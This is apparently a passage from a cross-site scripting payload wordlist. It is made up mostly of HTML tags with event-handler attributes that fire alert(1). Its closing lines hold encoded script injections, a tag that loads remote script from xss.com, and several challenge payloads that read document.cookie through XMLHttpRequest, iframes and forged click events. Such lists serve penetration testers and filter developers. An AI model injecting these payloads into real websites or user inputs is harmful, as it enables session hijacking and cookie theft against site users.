5822 | <time id=x tabindex=1 onactivate=alert(1)></time>
5823 | <time id=x tabindex=1 onbeforeactivate=alert(1)></time>
5824 | <time id=x tabindex=1 onbeforedeactivate=alert(1)></time><input autofocus>
5825 | <time id=x tabindex=1 ondeactivate=alert(1)></time><input id=y autofocus>
5826 | <time id=x tabindex=1 onfocus=alert(1)></time>
5827 | <time id=x tabindex=1 onfocusin=alert(1)></time>
5828 | <time onbeforecopy="alert(1)" contenteditable>test</time>
5829 | <time onbeforecut="alert(1)" contenteditable>test</time>
5830 | <time onbeforepaste="alert(1)" contenteditable>test</time>
5831 | <time onblur=alert(1) tabindex=1 id=x></time><input autofocus>
5832 | <time onclick="alert(1)">test</time>
5833 | <time oncontextmenu="alert(1)">test</time>
5834 | <time oncopy="alert(1)" contenteditable>test</time>
5835 | <time oncut="alert(1)" contenteditable>test</time>
5836 | <time ondblclick="alert(1)">test</time>
5837 | <time onfocusout=alert(1) tabindex=1 id=x></time><input autofocus>
5838 | <time onkeydown="alert(1)" contenteditable>test</time>
5839 | <time onkeypress="alert(1)" contenteditable>test</time>
5840 | <time onkeyup="alert(1)" contenteditable>test</time>
5841 | <time onmousedown="alert(1)">test</time>
5842 | <time onmouseenter="alert(1)">test</time>
5843 | <time onmouseleave="alert(1)">test</time>
5844 | <time onmousemove="alert(1)">test</time>
5845 | <time onmouseout="alert(1)">test</time>
5846 | <time onmouseover="alert(1)">test</time>
5847 | <time onmouseup="alert(1)">test</time>
5848 | <time onpaste="alert(1)" contenteditable>test</time>
5849 | <title draggable="true" ondrag="alert(1)">test</title>
5850 | <title draggable="true" ondragend="alert(1)">test</title>
5851 | <title draggable="true" ondragenter="alert(1)">test</title>
5852 | <title draggable="true" ondragleave="alert(1)">test</title>
5853 | <title draggable="true" ondragstart="alert(1)">test</title>
5854 | <title id=x tabindex=1 onactivate=alert(1)></title>
5855 | <title id=x tabindex=1 onbeforeactivate=alert(1)></title>
5856 | <title id=x tabindex=1 onbeforedeactivate=alert(1)></title><input autofocus>
5857 | <title id=x tabindex=1 ondeactivate=alert(1)></title><input id=y autofocus>
5858 | <title id=x tabindex=1 onfocus=alert(1)></title>
5859 | <title id=x tabindex=1 onfocusin=alert(1)></title>
5860 | <title onbeforecopy="alert(1)" contenteditable>test</title>
5861 | <title onbeforecut="alert(1)" contenteditable>test</title>
5862 | <title onbeforepaste="alert(1)" contenteditable>test</title>
5863 | <title onblur=alert(1) tabindex=1 id=x></title><input autofocus>
5864 | <title onclick="alert(1)">test</title>
5865 | <title oncontextmenu="alert(1)">test</title>
5866 | <title oncopy="alert(1)" contenteditable>test</title>
5867 | <title oncut="alert(1)" contenteditable>test</title>
5868 | <title ondblclick="alert(1)">test</title>
5869 | <title onfocusout=alert(1) tabindex=1 id=x></title><input autofocus>
5870 | <title onkeydown="alert(1)" contenteditable>test</title>
5871 | <title onkeypress="alert(1)" contenteditable>test</title>
5872 | <title onkeyup="alert(1)" contenteditable>test</title>
5873 | <title onmousedown="alert(1)">test</title>
5874 | <title onmouseenter="alert(1)">test</title>
5875 | <title onmouseleave="alert(1)">test</title>
5876 | <title onmousemove="alert(1)">test</title>
5877 | <title onmouseout="alert(1)">test</title>
5878 | <title onmouseover="alert(1)">test</title>
5879 | <title onmouseup="alert(1)">test</title>
5880 | <title onpaste="alert(1)" contenteditable>test</title>
5881 | <tr draggable="true" ondrag="alert(1)">test</tr>
5882 | <tr draggable="true" ondragend="alert(1)">test</tr>
5883 | <tr draggable="true" ondragenter="alert(1)">test</tr>
5884 | <tr draggable="true" ondragleave="alert(1)">test</tr>
5885 | <tr draggable="true" ondragstart="alert(1)">test</tr>
5886 | <tr id=x tabindex=1 onactivate=alert(1)></tr>
5887 | <tr id=x tabindex=1 onbeforeactivate=alert(1)></tr>
5888 | <tr id=x tabindex=1 onbeforedeactivate=alert(1)></tr><input autofocus>
5889 | <tr id=x tabindex=1 ondeactivate=alert(1)></tr><input id=y autofocus>
5890 | <tr id=x tabindex=1 onfocus=alert(1)></tr>
5891 | <tr id=x tabindex=1 onfocusin=alert(1)></tr>
5892 | <tr onbeforecopy="alert(1)" contenteditable>test</tr>
5893 | <tr onbeforecut="alert(1)" contenteditable>test</tr>
5894 | <tr onbeforepaste="alert(1)" contenteditable>test</tr>
5895 | <tr onblur=alert(1) tabindex=1 id=x></tr><input autofocus>
5896 | <tr onclick="alert(1)">test</tr>
5897 | <tr oncontextmenu="alert(1)">test</tr>
5898 | <tr oncopy="alert(1)" contenteditable>test</tr>
5899 | <tr oncut="alert(1)" contenteditable>test</tr>
5900 | <tr ondblclick="alert(1)">test</tr>
5901 | <tr onfocusout=alert(1) tabindex=1 id=x></tr><input autofocus>
5902 | <tr onkeydown="alert(1)" contenteditable>test</tr>
5903 | <tr onkeypress="alert(1)" contenteditable>test</tr>
5904 | <tr onkeyup="alert(1)" contenteditable>test</tr>
5905 | <tr onmousedown="alert(1)">test</tr>
5906 | <tr onmouseenter="alert(1)">test</tr>
5907 | <tr onmouseleave="alert(1)">test</tr>
5908 | <tr onmousemove="alert(1)">test</tr>
5909 | <tr onmouseout="alert(1)">test</tr>
5910 | <tr onmouseover="alert(1)">test</tr>
5911 | <tr onmouseup="alert(1)">test</tr>
5912 | <tr onpaste="alert(1)" contenteditable>test</tr>
5913 | <track draggable="true" ondrag="alert(1)">test</track>
5914 | <track draggable="true" ondragend="alert(1)">test</track>
5915 | <track draggable="true" ondragenter="alert(1)">test</track>
5916 | <track draggable="true" ondragleave="alert(1)">test</track>
5917 | <track draggable="true" ondragstart="alert(1)">test</track>
5918 | <track id=x tabindex=1 onactivate=alert(1)></track>
5919 | <track id=x tabindex=1 onbeforeactivate=alert(1)></track>
5920 | <track id=x tabindex=1 onbeforedeactivate=alert(1)></track><input autofocus>
5921 | <track id=x tabindex=1 ondeactivate=alert(1)></track><input id=y autofocus>
5922 | <track id=x tabindex=1 onfocus=alert(1)></track>
5923 | <track id=x tabindex=1 onfocusin=alert(1)></track>
5924 | <track onbeforecopy="alert(1)" contenteditable>test</track>
5925 | <track onbeforecut="alert(1)" contenteditable>test</track>
5926 | <track onbeforepaste="alert(1)" contenteditable>test</track>
5927 | <track onblur=alert(1) tabindex=1 id=x></track><input autofocus>
5928 | <track onclick="alert(1)">test</track>
5929 | <track oncontextmenu="alert(1)">test</track>
5930 | <track oncopy="alert(1)" contenteditable>test</track>
5931 | <track oncut="alert(1)" contenteditable>test</track>
5932 | <track ondblclick="alert(1)">test</track>
5933 | <track onfocusout=alert(1) tabindex=1 id=x></track><input autofocus>
5934 | <track onkeydown="alert(1)" contenteditable>test</track>
5935 | <track onkeypress="alert(1)" contenteditable>test</track>
5936 | <track onkeyup="alert(1)" contenteditable>test</track>
5937 | <track onmousedown="alert(1)">test</track>
5938 | <track onmouseenter="alert(1)">test</track>
5939 | <track onmouseleave="alert(1)">test</track>
5940 | <track onmousemove="alert(1)">test</track>
5941 | <track onmouseout="alert(1)">test</track>
5942 | <track onmouseover="alert(1)">test</track>
5943 | <track onmouseup="alert(1)">test</track>
5944 | <track onpaste="alert(1)" contenteditable>test</track>
5945 | <tt draggable="true" ondrag="alert(1)">test</tt>
5946 | <tt draggable="true" ondragend="alert(1)">test</tt>
5947 | <tt draggable="true" ondragenter="alert(1)">test</tt>
5948 | <tt draggable="true" ondragleave="alert(1)">test</tt>
5949 | <tt draggable="true" ondragstart="alert(1)">test</tt>
5950 | <tt id=x tabindex=1 onactivate=alert(1)></tt>
5951 | <tt id=x tabindex=1 onbeforeactivate=alert(1)></tt>
5952 | <tt id=x tabindex=1 onbeforedeactivate=alert(1)></tt><input autofocus>
5953 | <tt id=x tabindex=1 ondeactivate=alert(1)></tt><input id=y autofocus>
5954 | <tt id=x tabindex=1 onfocus=alert(1)></tt>
5955 | <tt id=x tabindex=1 onfocusin=alert(1)></tt>
5956 | <tt onbeforecopy="alert(1)" contenteditable>test</tt>
5957 | <tt onbeforecut="alert(1)" contenteditable>test</tt>
5958 | <tt onbeforepaste="alert(1)" contenteditable>test</tt>
5959 | <tt onblur=alert(1) tabindex=1 id=x></tt><input autofocus>
5960 | <tt onclick="alert(1)">test</tt>
5961 | <tt oncontextmenu="alert(1)">test</tt>
5962 | <tt oncopy="alert(1)" contenteditable>test</tt>
5963 | <tt oncut="alert(1)" contenteditable>test</tt>
5964 | <tt ondblclick="alert(1)">test</tt>
5965 | <tt onfocusout=alert(1) tabindex=1 id=x></tt><input autofocus>
5966 | <tt onkeydown="alert(1)" contenteditable>test</tt>
5967 | <tt onkeypress="alert(1)" contenteditable>test</tt>
5968 | <tt onkeyup="alert(1)" contenteditable>test</tt>
5969 | <tt onmousedown="alert(1)">test</tt>
5970 | <tt onmouseenter="alert(1)">test</tt>
5971 | <tt onmouseleave="alert(1)">test</tt>
5972 | <tt onmousemove="alert(1)">test</tt>
5973 | <tt onmouseout="alert(1)">test</tt>
5974 | <tt onmouseover="alert(1)">test</tt>
5975 | <tt onmouseup="alert(1)">test</tt>
5976 | <tt onpaste="alert(1)" contenteditable>test</tt>
5977 | <u draggable="true" ondrag="alert(1)">test</u>
5978 | <u draggable="true" ondragend="alert(1)">test</u>
5979 | <u draggable="true" ondragenter="alert(1)">test</u>
5980 | <u draggable="true" ondragleave="alert(1)">test</u>
5981 | <u draggable="true" ondragstart="alert(1)">test</u>
5982 | <u id=x tabindex=1 onactivate=alert(1)></u>
5983 | <u id=x tabindex=1 onbeforeactivate=alert(1)></u>
5984 | <u id=x tabindex=1 onbeforedeactivate=alert(1)></u><input autofocus>
5985 | <u id=x tabindex=1 ondeactivate=alert(1)></u><input id=y autofocus>
5986 | <u id=x tabindex=1 onfocus=alert(1)></u>
5987 | <u id=x tabindex=1 onfocusin=alert(1)></u>
5988 | <u onbeforecopy="alert(1)" contenteditable>test</u>
5989 | <u onbeforecut="alert(1)" contenteditable>test</u>
5990 | <u onbeforepaste="alert(1)" contenteditable>test</u>
5991 | <u onblur=alert(1) tabindex=1 id=x></u><input autofocus>
5992 | <u onclick="alert(1)">test</u>
5993 | <u oncontextmenu="alert(1)">test</u>
5994 | <u oncopy="alert(1)" contenteditable>test</u>
5995 | <u oncut="alert(1)" contenteditable>test</u>
5996 | <u ondblclick="alert(1)">test</u>
5997 | <u onfocusout=alert(1) tabindex=1 id=x></u><input autofocus>
5998 | <u onkeydown="alert(1)" contenteditable>test</u>
5999 | <u onkeypress="alert(1)" contenteditable>test</u>
6000 | <u onkeyup="alert(1)" contenteditable>test</u>
6001 | <u onmousedown="alert(1)">test</u>
6002 | <u onmouseenter="alert(1)">test</u>
6003 | <u onmouseleave="alert(1)">test</u>
6004 | <u onmousemove="alert(1)">test</u>
6005 | <u onmouseout="alert(1)">test</u>
6006 | <u onmouseover="alert(1)">test</u>
6007 | <u onmouseup="alert(1)">test</u>
6008 | <u onpaste="alert(1)" contenteditable>test</u>
6009 | <ul draggable="true" ondrag="alert(1)">test</ul>
6010 | <ul draggable="true" ondragend="alert(1)">test</ul>
6011 | <ul draggable="true" ondragenter="alert(1)">test</ul>
6012 | <ul draggable="true" ondragleave="alert(1)">test</ul>
6013 | <ul draggable="true" ondragstart="alert(1)">test</ul>
6014 | <ul id=x tabindex=1 onactivate=alert(1)></ul>
6015 | <ul id=x tabindex=1 onbeforeactivate=alert(1)></ul>
6016 | <ul id=x tabindex=1 onbeforedeactivate=alert(1)></ul><input autofocus>
6017 | <ul id=x tabindex=1 ondeactivate=alert(1)></ul><input id=y autofocus>
6018 | <ul id=x tabindex=1 onfocus=alert(1)></ul>
6019 | <ul id=x tabindex=1 onfocusin=alert(1)></ul>
6020 | <ul onbeforecopy="alert(1)" contenteditable>test</ul>
6021 | <ul onbeforecut="alert(1)" contenteditable>test</ul>
6022 | <ul onbeforepaste="alert(1)" contenteditable>test</ul>
6023 | <ul onblur=alert(1) tabindex=1 id=x></ul><input autofocus>
6024 | <ul onclick="alert(1)">test</ul>
6025 | <ul oncontextmenu="alert(1)">test</ul>
6026 | <ul oncopy="alert(1)" contenteditable>test</ul>
6027 | <ul oncut="alert(1)" contenteditable>test</ul>
6028 | <ul ondblclick="alert(1)">test</ul>
6029 | <ul onfocusout=alert(1) tabindex=1 id=x></ul><input autofocus>
6030 | <ul onkeydown="alert(1)" contenteditable>test</ul>
6031 | <ul onkeypress="alert(1)" contenteditable>test</ul>
6032 | <ul onkeyup="alert(1)" contenteditable>test</ul>
6033 | <ul onmousedown="alert(1)">test</ul>
6034 | <ul onmouseenter="alert(1)">test</ul>
6035 | <ul onmouseleave="alert(1)">test</ul>
6036 | <ul onmousemove="alert(1)">test</ul>
6037 | <ul onmouseout="alert(1)">test</ul>
6038 | <ul onmouseover="alert(1)">test</ul>
6039 | <ul onmouseup="alert(1)">test</ul>
6040 | <ul onpaste="alert(1)" contenteditable>test</ul>
6041 | <var draggable="true" ondrag="alert(1)">test</var>
6042 | <var draggable="true" ondragend="alert(1)">test</var>
6043 | <var draggable="true" ondragenter="alert(1)">test</var>
6044 | <var draggable="true" ondragleave="alert(1)">test</var>
6045 | <var draggable="true" ondragstart="alert(1)">test</var>
6046 | <var id=x tabindex=1 onactivate=alert(1)></var>
6047 | <var id=x tabindex=1 onbeforeactivate=alert(1)></var>
6048 | <var id=x tabindex=1 onbeforedeactivate=alert(1)></var><input autofocus>
6049 | <var id=x tabindex=1 ondeactivate=alert(1)></var><input id=y autofocus>
6050 | <var id=x tabindex=1 onfocus=alert(1)></var>
6051 | <var id=x tabindex=1 onfocusin=alert(1)></var>
6052 | <var onbeforecopy="alert(1)" contenteditable>test</var>
6053 | <var onbeforecut="alert(1)" contenteditable>test</var>
6054 | <var onbeforepaste="alert(1)" contenteditable>test</var>
6055 | <var onblur=alert(1) tabindex=1 id=x></var><input autofocus>
6056 | <var onclick="alert(1)">test</var>
6057 | <var oncontextmenu="alert(1)">test</var>
6058 | <var oncopy="alert(1)" contenteditable>test</var>
6059 | <var oncut="alert(1)" contenteditable>test</var>
6060 | <var ondblclick="alert(1)">test</var>
6061 | <var onfocusout=alert(1) tabindex=1 id=x></var><input autofocus>
6062 | <var onkeydown="alert(1)" contenteditable>test</var>
6063 | <var onkeypress="alert(1)" contenteditable>test</var>
6064 | <var onkeyup="alert(1)" contenteditable>test</var>
6065 | <var onmousedown="alert(1)">test</var>
6066 | <var onmouseenter="alert(1)">test</var>
6067 | <var onmouseleave="alert(1)">test</var>
6068 | <var onmousemove="alert(1)">test</var>
6069 | <var onmouseout="alert(1)">test</var>
6070 | <var onmouseover="alert(1)">test</var>
6071 | <var onmouseup="alert(1)">test</var>
6072 | <var onpaste="alert(1)" contenteditable>test</var>
6073 | <video autoplay controls onpause=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
6074 | <video autoplay controls onseeked=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
6075 | <video autoplay controls onseeking=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
6076 | <video autoplay controls onvolumechange=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
6077 | <video autoplay controls onwaiting=alert(1)><source src="validvideo.mp4" type=video/mp4></video>
6078 | <video autoplay onloadedmetadata=alert(1)> <source src="validvideo.mp4" type="video/mp4"></video>
6079 | <video autoplay onplay=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
6080 | <video autoplay onplaying=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
6081 | <video controls autoplay onended=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
6082 | <video controls autoplay ontimeupdate=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
6083 | <video draggable="true" ondrag="alert(1)">test</video>
6084 | <video draggable="true" ondragend="alert(1)">test</video>
6085 | <video draggable="true" ondragenter="alert(1)">test</video>
6086 | <video draggable="true" ondragleave="alert(1)">test</video>
6087 | <video draggable="true" ondragstart="alert(1)">test</video>
6088 | <video id=x controls onfocus=alert(1)><source src="validvideo.mp4" type=video/mp4></video>
6089 | <video id=x controls onfocusin=alert(1)><source src="validvideo.mp4" type=video/mp4></video>
6090 | <video id=x tabindex=1 onactivate=alert(1)></video>
6091 | <video id=x tabindex=1 onbeforeactivate=alert(1)></video>
6092 | <video id=x tabindex=1 onbeforedeactivate=alert(1)></video><input autofocus>
6093 | <video id=x tabindex=1 ondeactivate=alert(1)></video><input id=y autofocus>
6094 | <video onbeforecopy="alert(1)" contenteditable>test</video>
6095 | <video onbeforecut="alert(1)" contenteditable>test</video>
6096 | <video onbeforepaste="alert(1)" contenteditable>test</video>
6097 | <video onblur=alert(1) tabindex=1 id=x></video><input autofocus>
6098 | <video oncanplay=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
6099 | <video oncanplaythrough=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
6100 | <video onclick="alert(1)">test</video>
6101 | <video oncontextmenu="alert(1)">test</video>
6102 | <video oncopy="alert(1)" contenteditable>test</video>
6103 | <video oncut="alert(1)" contenteditable>test</video>
6104 | <video ondblclick="alert(1)">test</video>
6105 | <video onfocusout=alert(1) tabindex=1 id=x></video><input autofocus>
6106 | <video onkeydown="alert(1)" contenteditable>test</video>
6107 | <video onkeypress="alert(1)" contenteditable>test</video>
6108 | <video onkeyup="alert(1)" contenteditable>test</video>
6109 | <video onloadeddata=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
6110 | <video onmousedown="alert(1)">test</video>
6111 | <video onmouseenter="alert(1)">test</video>
6112 | <video onmouseleave="alert(1)">test</video>
6113 | <video onmousemove="alert(1)">test</video>
6114 | <video onmouseout="alert(1)">test</video>
6115 | <video onmouseover="alert(1)">test</video>
6116 | <video onmouseup="alert(1)">test</video>
6117 | <video onpaste="alert(1)" contenteditable>test</video>
6118 | <video src/onerror=alert(1)>
6119 | <video><source onerror=alert(1) src=1></video>
6120 | <video><track default onload=alert(1) src="data:text/vtt,WEBVTT"></video>
6121 | <wbr draggable="true" ondrag="alert(1)">test</wbr>
6122 | <wbr draggable="true" ondragend="alert(1)">test</wbr>
6123 | <wbr draggable="true" ondragenter="alert(1)">test</wbr>
6124 | <wbr draggable="true" ondragleave="alert(1)">test</wbr>
6125 | <wbr draggable="true" ondragstart="alert(1)">test</wbr>
6126 | <wbr id=x tabindex=1 onactivate=alert(1)></wbr>
6127 | <wbr id=x tabindex=1 onbeforeactivate=alert(1)></wbr>
6128 | <wbr id=x tabindex=1 onbeforedeactivate=alert(1)></wbr><input autofocus>
6129 | <wbr id=x tabindex=1 ondeactivate=alert(1)></wbr><input id=y autofocus>
6130 | <wbr id=x tabindex=1 onfocus=alert(1)></wbr>
6131 | <wbr id=x tabindex=1 onfocusin=alert(1)></wbr>
6132 | <wbr onbeforecopy="alert(1)" contenteditable>test</wbr>
6133 | <wbr onbeforecut="alert(1)" contenteditable>test</wbr>
6134 | <wbr onbeforepaste="alert(1)" contenteditable>test</wbr>
6135 | <wbr onblur=alert(1) tabindex=1 id=x></wbr><input autofocus>
6136 | <wbr onclick="alert(1)">test</wbr>
6137 | <wbr oncontextmenu="alert(1)">test</wbr>
6138 | <wbr oncopy="alert(1)" contenteditable>test</wbr>
6139 | <wbr oncut="alert(1)" contenteditable>test</wbr>
6140 | <wbr ondblclick="alert(1)">test</wbr>
6141 | <wbr onfocusout=alert(1) tabindex=1 id=x></wbr><input autofocus>
6142 | <wbr onkeydown="alert(1)" contenteditable>test</wbr>
6143 | <wbr onkeypress="alert(1)" contenteditable>test</wbr>
6144 | <wbr onkeyup="alert(1)" contenteditable>test</wbr>
6145 | <wbr onmousedown="alert(1)">test</wbr>
6146 | <wbr onmouseenter="alert(1)">test</wbr>
6147 | <wbr onmouseleave="alert(1)">test</wbr>
6148 | <wbr onmousemove="alert(1)">test</wbr>
6149 | <wbr onmouseout="alert(1)">test</wbr>
6150 | <wbr onmouseover="alert(1)">test</wbr>
6151 | <wbr onmouseup="alert(1)">test</wbr>
6152 | <wbr onpaste="alert(1)" contenteditable>test</wbr>
6153 | <xmp draggable="true" ondrag="alert(1)">test</xmp>
6154 | <xmp draggable="true" ondragend="alert(1)">test</xmp>
6155 | <xmp draggable="true" ondragenter="alert(1)">test</xmp>
6156 | <xmp draggable="true" ondragleave="alert(1)">test</xmp>
6157 | <xmp draggable="true" ondragstart="alert(1)">test</xmp>
6158 | <xmp id=x tabindex=1 onactivate=alert(1)></xmp>
6159 | <xmp id=x tabindex=1 onbeforeactivate=alert(1)></xmp>
6160 | <xmp id=x tabindex=1 onbeforedeactivate=alert(1)></xmp><input autofocus>
6161 | <xmp id=x tabindex=1 ondeactivate=alert(1)></xmp><input id=y autofocus>
6162 | <xmp id=x tabindex=1 onfocus=alert(1)></xmp>
6163 | <xmp id=x tabindex=1 onfocusin=alert(1)></xmp>
6164 | <xmp onbeforecopy="alert(1)" contenteditable>test</xmp>
6165 | <xmp onbeforecut="alert(1)" contenteditable>test</xmp>
6166 | <xmp onbeforepaste="alert(1)" contenteditable>test</xmp>
6167 | <xmp onblur=alert(1) tabindex=1 id=x></xmp><input autofocus>
6168 | <xmp onclick="alert(1)">test</xmp>
6169 | <xmp oncontextmenu="alert(1)">test</xmp>
6170 | <xmp oncopy="alert(1)" contenteditable>test</xmp>
6171 | <xmp oncut="alert(1)" contenteditable>test</xmp>
6172 | <xmp ondblclick="alert(1)">test</xmp>
6173 | <xmp onfocusout=alert(1) tabindex=1 id=x></xmp><input autofocus>
6174 | <xmp onkeydown="alert(1)" contenteditable>test</xmp>
6175 | <xmp onkeypress="alert(1)" contenteditable>test</xmp>
6176 | <xmp onkeyup="alert(1)" contenteditable>test</xmp>
6177 | <xmp onmousedown="alert(1)">test</xmp>
6178 | <xmp onmouseenter="alert(1)">test</xmp>
6179 | <xmp onmouseleave="alert(1)">test</xmp>
6180 | <xmp onmousemove="alert(1)">test</xmp>
6181 | <xmp onmouseout="alert(1)">test</xmp>
6182 | <xmp onmouseover="alert(1)">test</xmp>
6183 | <xmp onmouseup="alert(1)">test</xmp>
6184 | <xmp onpaste="alert(1)" contenteditable>test</xmp>
6185 | <xss id=x tabindex=1 onactivate=alert(1)></xss>
6186 | <xss id=x tabindex=1 onbeforeactivate=alert(1)></xss>
6187 | <xss id=x tabindex=1 onbeforedeactivate=alert(1)></xss><input autofocus>
6188 | <xss id=x tabindex=1 onblur=alert(1)></xss><input autofocus>
6189 | <xss id=x tabindex=1 ondeactivate=alert(1)></xss><input autofocus>
6190 | <xss id=x tabindex=1 onfocus=alert(1)></xss>
6191 | <xss id=x tabindex=1 onfocusin=alert(1)></xss>
6192 | <xss id=x tabindex=1 onfocusout=alert(1)></xss><input autofocus>
6193 | '%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Eshadowlabs(0x000045)%3C/script%3E
6194 | <<scr\0ipt/src=http://xss.com/xss.js></script
6195 | %27%22--%3E%3C%2Fstyle%3E%3C%2Fscript%3E%3Cscript%3ERWAR%280x00010E%29%3C%2Fscript%3E
6196 | ' onmouseover=alert(/XSS/)
6197 | "><iframe%20src="http://google.com"%%203E
6198 | '<script>window.onload=function(){document.forms[0].message.value='1';}</script>
6199 | x”</title><img src%3dx onerror%3dalert(1)>
6200 | <script> document.getElementById(%22safe123%22).setCapture(); document.getElementById(%22safe123%22).click(); </script>
6201 | <script>Object.defineProperties(window, {Safe: {value: {get: function() {return document.cookie}}}});alert(Safe.get())</script>
6202 | <script>var x = document.createElement('iframe');document.body.appendChild(x);var xhr = x.contentWindow.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();</script>
6203 | <script>(function() {var event = document.createEvent(%22MouseEvents%22);event.initMouseEvent(%22click%22, true, true, window, 0, 0, 0, 0, 0, false, false, false, false, 0, null);var fakeData = [event, {isTrusted: true}, event];arguments.__defineGetter__('0', function() { return fakeData.pop(); });alert(Safe.get.apply(null, arguments));})();</script>
6204 | <script>var script = document.getElementsByTagName('script')[0]; var clone = script.childNodes[0].cloneNode(true); var ta = document.createElement('textarea'); ta.appendChild(clone); alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>
6205 | <script>xhr=new ActiveXObject(%22Msxml2.XMLHTTP%22);xhr.open(%22GET%22,%22/xssme2%22,true);xhr.onreadystatechange=function(){if(xhr.readyState==4%26%26xhr.status==200){alert(xhr.responseText.match(/'([^']%2b)/)[1])}};xhr.send();</script>
6206 | <script>alert(document.documentElement.innerHTML.match(/'([^']%2b)/)[1])</script>
6207 | <script>alert(document.getElementsByTagName('html')[0].innerHTML.match(/'([^']%2b)/)[1])</script>
6208 | <%73%63%72%69%70%74> %64 = %64%6f%63%75%6d%65%6e%74%2e%63%72%65%61%74%65%45%6c%65%6d%65%6e%74(%22%64%69%76%22); %64%2e%61%70%70%65%6e%64%43%68%69%6c%64(%64%6f%63%75%6d%65%6e%74%2e%68%65%61%64%2e%63%6c%6f%6e%65%4e%6f%64%65(%74%72%75%65)); %61%6c%65%72%74(%64%2e%69%6e%6e%65%72%48%54%4d%4c%2e%6d%61%74%63%68(%22%63%6f%6f%6b%69%65 = '(%2e%2a%3f)'%22)[%31]); </%73%63%72%69%70%74>
6209 | <script> var xdr = new ActiveXObject(%22Microsoft.XMLHTTP%22);  xdr.open(%22get%22, %22/xssme2%3Fa=1%22, true); xdr.onreadystatechange = function() { try{   var c;   if (c=xdr.responseText.match(/document.cookie = '(.*%3F)'/) )    alert(c[1]); }catch(e){} };  xdr.send(); </script>
6210 | <iframe id=%22ifra%22 src=%22/%22></iframe> <script>ifr = document.getElementById('ifra'); ifr.contentDocument.write(%22<scr%22 %2b %22ipt>top.foo = Object.defineProperty</scr%22 %2b %22ipt>%22); foo(window, 'Safe', {value:{}}); foo(Safe, 'get', {value:function() {    return document.cookie }}); alert(Safe.get());</script>
6211 | <script>alert(document.head.innerHTML.substr(146,20));</script>
6212 | <script>alert(document.head.childNodes[3].text)</script>
6213 | <script>var request = new XMLHttpRequest();request.open('GET', 'http://html5sec.org/xssme2', false);request.send(null);if (request.status == 200){alert(request.responseText.substr(150,41));}</script>
6214 | <script>Object.defineProperty(window, 'Safe', {value:{}});Object.defineProperty(Safe, 'get', {value:function() {return document.cookie}});alert(Safe.get())</script>
6215 | <script>x=document.createElement(%22iframe%22);x.src=%22http://xssme.html5sec.org/404%22;x.onload=function(){window.frames[0].document.write(%22<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%22)};document.body.appendChild(x);</script>
6216 | <script>x=document.createElement(%22iframe%22);x.src=%22http://xssme.html5sec.org/404%22;x.onload=function(){window.frames[0].document.write(%22<script>Object.defineProperty(parent,'Safe',{value:{}});Object.defineProperty(parent.Safe,'get',{value:function(){return top.document.cookie}});alert(parent.Safe.get())<\/script>%22)};document.body.appendChild(x);</script>
6217 | <script> var+xmlHttp+=+null; try+{ xmlHttp+=+new+XMLHttpRequest(); }+catch(e)+{} if+(xmlHttp)+{ xmlHttp.open('GET',+'/xssme2',+true); xmlHttp.onreadystatechange+=+function+()+{ if+(xmlHttp.readyState+==+4)+{ xmlHttp.responseText.match(/document.cookie%5Cs%2B=%5Cs%2B'(.*)'/gi); alert(RegExp.%241); } } xmlHttp.send(null); }; </script>
6218 | <script> document.getElementById(%22safe123%22).click=function()+{alert(Safe.get());} document.getElementById(%22safe123%22).click({'type':'click','isTrusted':true}); </script>
6219 | <script> var+MouseEvent=function+MouseEvent(){}; MouseEvent=MouseEvent var+test=new+MouseEvent(); test.isTrusted=true; test.type='click';  document.getElementById(%22safe123%22).click=function()+{alert(Safe.get());} document.getElementById(%22safe123%22).click(test); </script>
6220 | <script>  (function (o) {   function exploit(x) {    if (x !== null)     alert('User cookie is ' %2B x);    else     console.log('fail');   }      o.onclick = function (e) {    e.__defineGetter__('isTrusted', function () { return true; });    exploit(Safe.get());   };      var e = document.createEvent('MouseEvent');   e.initEvent('click', true, true);   o.dispatchEvent(e);  })(document.getElementById('safe123')); </script>
6221 | <iframe src=/ onload=eval(unescape(this.name.replace(/\/g,null))) name=fff%253Dnew%2520this.contentWindow.window.XMLHttpRequest%2528%2529%253Bfff.open%2528%2522GET%2522%252C%2522xssme2%2522%2529%253Bfff.onreadystatechange%253Dfunction%2528%2529%257Bif%2520%2528fff.readyState%253D%253D4%2520%2526%2526%2520fff.status%253D%253D200%2529%257Balert%2528fff.responseText%2529%253B%257D%257D%253Bfff.send%2528%2529%253B></iframe>
6222 | <script>     function b() { return Safe.get(); } alert(b({type:String.fromCharCode(99,108,105,99,107),isTrusted:true})); </script>
6223 | <img src=http://www.google.fr/images/srpr/logo3w.png onload=alert(this.ownerDocument.cookie) width=0 height= 0 /> #
6224 | <script>  function foo(elem, doc, text) {   elem.onclick = function (e) {    e.__defineGetter__(text[0], function () { return true })    alert(Safe.get());   };      var event = doc.createEvent(text[1]);   event.initEvent(text[2], true, true);   elem.dispatchEvent(event);  } </script> <img src=http://www.google.fr/images/srpr/logo3w.png onload=foo(this,this.ownerDocument,this.name.split(/,/)) name=isTrusted,MouseEvent,click width=0 height=0 /> #
6225 | <SCRIPT+FOR=document+EVENT=onreadystatechange>MouseEvent=function+MouseEvent(){};test=new+MouseEvent();test.isTrusted=true;test.type=%22click%22;getElementById(%22safe123%22).click=function()+{alert(Safe.get());};getElementById(%22safe123%22).click(test);</SCRIPT>#
